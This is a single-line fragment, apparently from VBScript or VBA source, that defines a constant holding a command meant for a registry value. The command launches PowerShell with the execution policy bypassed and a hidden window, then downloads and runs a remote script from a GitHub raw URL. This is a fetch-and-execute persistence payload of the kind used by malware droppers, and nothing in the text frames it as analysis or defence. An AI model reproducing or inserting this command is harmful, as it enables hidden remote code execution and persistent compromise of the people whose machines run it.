...
Const DefaultRegKeyValue = "cmd.exe /c powershell.exe -exec bypass -w 1 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/boomer/master/WV1.ps1')"
